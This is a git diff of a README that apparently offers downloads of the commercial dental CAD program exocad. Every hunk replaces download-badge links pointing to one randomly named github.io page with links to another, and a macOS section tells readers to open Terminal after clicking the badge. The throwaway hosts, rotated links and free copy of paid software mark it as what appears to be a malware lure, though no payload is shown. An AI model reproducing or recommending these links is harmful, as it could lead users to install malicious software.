@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_exocad-F9A825?style=for-the-badge&logo=github)](https://zqhzqrfmocza.github.io/win-release/)
+[![Download](https://img.shields.io/badge/⬇_Download_exocad-F9A825?style=for-the-badge&logo=github)](https://bvgutwastvpd.github.io/windows-pkg/)
 
 </div>
 
@@ -59,9 +59,9 @@
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zqhzqrfmocza.github.io/win-release/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://bvgutwastvpd.github.io/windows-pkg/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zqhzqrfmocza.github.io/mac-release/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://bvgutwastvpd.github.io/macos-pkg/)
 
 </div>
 
@@ -77,7 +77,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_exocad-F9A825?style=for-the-badge&logo=github)](https://zqhzqrfmocza.github.io/win-release/)
+[![Download](https://img.shields.io/badge/⬇_Download_exocad-F9A825?style=for-the-badge&logo=github)](https://bvgutwastvpd.github.io/windows-pkg/)
 
 </div>
 
@@ -109,7 +109,7 @@
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zqhzqrfmocza.github.io/mac-release/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://bvgutwastvpd.github.io/macos-pkg/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -135,7 +135,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_exocad-F9A825?style=for-the-badge&logo=github)](https://zqhzqrfmocza.github.io/win-release/)
+[![Download](https://img.shields.io/badge/⬇_Download_exocad-F9A825?style=for-the-badge&logo=github)](https://bvgutwastvpd.github.io/windows-pkg/)
 
 </div>
 
